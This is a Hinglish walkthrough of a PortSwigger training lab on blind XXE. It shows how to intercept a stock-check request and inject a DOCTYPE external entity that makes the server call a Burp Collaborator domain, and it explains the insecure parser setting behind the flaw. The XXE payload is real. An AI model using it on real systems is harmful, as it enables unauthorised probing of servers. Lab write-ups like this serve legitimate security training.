### **Concept samjho pehle**

Normal XXE main tumhe server ka response turant mil jata hai (jaise `/etc/passwd` content).
Lekin Blind XXE main **response nahi aata screen par**, is liye tumhe **out-of-band (OOB)** technique use karni padti hai jahan server kahi aur (tumhari control wali domain) request bhejta hai.
PortSwigger ne is liye **Burp Collaborator** diya hai (ek temporary domain server jo tumhare liye logs capture karta hai).

---

### **Lab solve karne ka full method**

1. **Product page kholo**

   * Kisi bhi product par "Check stock" button press karo.
   * Burp Suite main proxy on rakho taake request intercept ho jaye.

2. **Request intercept karo**

   * Request kuch aisa hoga:

     ```xml
     <?xml version="1.0" encoding="UTF-8"?>
     <stockCheck>
       <productId>1</productId>
     </stockCheck>
     ```

3. **External entity inject karo**

   * Ab tumhe XML ke andar **DOCTYPE + entity** add karna hai.
   * Burp Collaborator ka payload insert karna (right-click → Insert Collaborator payload).

   Final payload kuch aisa hoga:

   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://abc123xyz.burpcollaborator.net"> ]>
   <stockCheck>
     <productId>&xxe;</productId>
   </stockCheck>
   ```

   > Yahaan `abc123xyz.burpcollaborator.net` automatically Burp se milega.

4. **Request forward karo**

   * Ab request send kardo server ko.

5. **Collaborator tab check karo**

   * Burp Collaborator tab main jaake **Poll now** press karo.
   * Agar sab sahi hua to tumhe ek **DNS + HTTP interaction** dikhai dega, jo server ne tumhari entity ke liye request bheji.

6. **Lab solved ho jayega**

   * Jaise hi interaction dikh gaya, lab mark as solved ho jayega.

---

### **Root understanding (first principles style)**

* **Kya hua background main?**

  * Server ne tumhara `&xxe;` resolve karna chaha.
  * Usne `SYSTEM` entity ke andar wali URL call kar di.
  * Jaise hi call hui → Burp Collaborator ne record kar li.
  * Yehi proof hai ki XXE exist karta hai.

* **Developer ki galti?**

  * XML parser ko unsecure mode pe chhoda (External Entity resolution allow kar diya).

